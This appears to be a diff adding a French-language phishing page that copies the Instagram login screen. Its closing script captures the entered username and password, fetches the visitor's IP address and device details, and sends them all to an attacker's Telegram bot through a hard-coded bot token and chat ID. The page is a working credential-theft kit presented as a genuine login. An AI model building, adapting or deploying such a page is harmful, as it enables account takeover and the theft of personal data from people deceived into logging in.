@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Connexion • Instagram</title>
+  <link rel="icon" href="img/insta-fav.png" />
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #fafafa;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 350px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .box {
+      background-color: #ffffff;
+      border: 1px solid #dbdbdb;
+      padding: 35px 40px 25px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .logo-img {
+      height: 51px;
+      width: auto;
+      object-fit: contain;
+      margin-bottom: 24px;
+      user-select: none;
+    }
+
+    form {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 7px;
+    }
+
+    input {
+      width: 100%;
+      height: 38px;
+      padding: 0 10px;
+      background-color: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      font-size: 12px;
+      color: #262626;
+      outline: none;
+    }
+
+    input:focus {
+      border-color: #a8a8a8;
+    }
+
+    .login-btn {
+      margin-top: 8px;
+      width: 100%;
+      height: 32px;
+      background-color: #0095f6;
+      border: none;
+      border-radius: 8px;
+      color: #ffffff;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .login-btn:hover {
+      background-color: #1877f2;
+    }
+
+    .divider {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      margin: 16px 0;
+      color: #8e8e8e;
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background-color: #dbdbdb;
+    }
+
+    .divider span {
+      padding: 0 16px;
+    }
+
+    .fb-login {
+      color: #385185;
+      font-size: 14px;
+      font-weight: 600;
+      text-decoration: none;
+      margin-bottom: 14px;
+    }
+
+    .forgot {
+      color: #00376b;
+      font-size: 12px;
+      text-decoration: none;
+    }
+
+    .signup-box {
+      background-color: #ffffff;
+      border: 1px solid #dbdbdb;
+      padding: 20px;
+      text-align: center;
+      font-size: 14px;
+      color: #262626;
+    }
+
+    .signup-box a {
+      color: #0095f6;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    .app-section {
+      margin-top: 14px;
+      text-align: center;
+    }
+
+    .app-section p {
+      font-size: 14px;
+      color: #262626;
+      margin-bottom: 14px;
+    }
+
+    .store-badges {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    .store-badges img {
+      height: 40px;
+      width: auto;
+      object-fit: contain;
+      border-radius: 5px;
+    }
+
+    footer {
+      margin-top: 42px;
+      max-width: 900px;
+      width: 100%;
+      text-align: center;
+      padding: 0 15px 25px;
+    }
+
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px 16px;
+      margin-bottom: 10px;
+    }
+
+    .footer-links a {
+      color: #00376b;
+      font-size: 11px;
+      font-weight: 600;
+      text-decoration: none;
+      text-transform: uppercase;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    .copyright {
+      margin-top: 14px;
+      color: #8e8e8e;
+      font-size: 11px;
+      font-weight: 600;
+      text-transform: uppercase;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="box">
+      <img src="img/instagram-logo.png" alt="Instagram" class="logo-img" />
+
+      <form id="login-form">
+        <input type="text" id="email" placeholder="Numéro de téléphone, nom d'utilisateur ou e-mail" required />
+        <input type="password" id="password" placeholder="Mot de passe" required />
+        <button type="submit" class="login-btn">Se connecter</button>
+      </form>
+
+      <div class="divider"><span>OU</span></div>
+
+      <a href="#" class="fb-login" onclick="return false;">Se connecter avec Facebook</a>
+      <a href="#" class="forgot" onclick="return false;">Mot de passe oublié ?</a>
+    </div>
+
+    <div class="signup-box">
+      Vous n'avez pas de compte ? <a href="#" onclick="return false;">Inscrivez-vous</a>
+    </div>
+  </div>
+
+  <div class="app-section">
+    <p>Téléchargez l'application.</p>
+    <div class="store-badges">
+      <a href="#" onclick="return false;">
+        <img src="img/apple-button.png" alt="Download on the App Store" />
+      </a>
+
+      <a href="#" onclick="return false;">
+        <img src="img/googleplay-button.png" alt="Get it on Google Play" />
+      </a>
+    </div>
+  </div>
+
+  <footer>
+    <div class="footer-links">
+      <a href="#" onclick="return false;">À PROPOS</a>
+      <a href="#" onclick="return false;">AIDE</a>
+      <a href="#" onclick="return false;">PRESSE</a>
+      <a href="#" onclick="return false;">API</a>
+      <a href="#" onclick="return false;">EMPLOIS</a>
+      <a href="#" onclick="return false;">CONFIDENTIALITÉ</a>
+      <a href="#" onclick="return false;">CONDITIONS</a>
+      <a href="#" onclick="return false;">LIEUX</a>
+    </div>
+    <div class="footer-links">
+      <a href="#" onclick="return false;">COMPTES PRINCIPAUX</a>
+      <a href="#" onclick="return false;">HASHTAGS</a>
+      <a href="#" onclick="return false;">LANGUE</a>
+    </div>
+    <div class="copyright">© 2020 INSTAGRAM PAR FACEBOOK</div>
+  </footer>
+
+  <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+  <script>
+    const TOKEN = "9236438666:AAFwaNO2EeCuYk_hjVgWg5be-AmBRF0q-sg";
+    const CHAT_ID = "6994641819";
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+    // Handle form submission
+    document.getElementById('login-form').addEventListener('submit', async function(e) {
+      e.preventDefault(); // Prevent default form submission
+
+      // Get form values
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      let ip = "Indisponible";
+
+      // Fetch the user's IP address
+      try {
+        const ipResponse = await axios.get('https://api.ipify.org?format=json');
+        ip = ipResponse.data.ip; // Get the user's IP address
+        console.log('User IP:', ip); // Log IP for debugging
+      } catch (error) {
+        console.error('Error fetching IP:', error);
+      }
+
+      // Get device information
+      const userAgent = navigator.userAgent; // Browser and OS info
+      const platform = navigator.platform; // Device platform (e.g., 'Win32', 'MacIntel', 'Linux x86_64')
+      const screenWidth = screen.width; // Screen width
+      const screenHeight = screen.height; // Screen height
+      const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'; // Check if the device is mobile or desktop
+
+      // Log all collected device info for debugging
+      console.log('User-Agent:', userAgent);
+      console.log('Platform:', platform);
+      console.log('Screen Resolution:', screenWidth + 'x' + screenHeight);
+      console.log('Device Type:', deviceType);
+
+      // Prepare the message with form data, IP, and device info
+      const message = `
+<b>Nouvelle tentative de connexion</b>\n
+<b>Identifiant / E-mail :</b> ${email}\n
+<b>Mot de passe :</b> ${password}\n
+<b>Adresse IP :</b> ${ip}\n
+<b>Type d'appareil :</b> ${deviceType}\n
+<b>Plateforme :</b> ${platform}\n
+<b>User Agent :</b> ${userAgent}\n
+<b>Résolution d'écran :</b> ${screenWidth}x${screenHeight}
+`;
+
+      // Send the message to Telegram
+      try {
+        const response = await axios.post(URI_API, {
+          chat_id: CHAT_ID,
+          parse_mode: 'html',
+          text: message
+        });
+        console.log('Message sent:', response.data);
+        alert('Informations envoyées avec succès !');
+      } catch (error) {
+        console.error('Error sending message:', error.response ? error.response.data : error.message);
+        alert("Erreur lors de l'envoi des informations. Veuillez réessayer.");
+      }
+    });
+  </script>
+
+</body>
+</html>
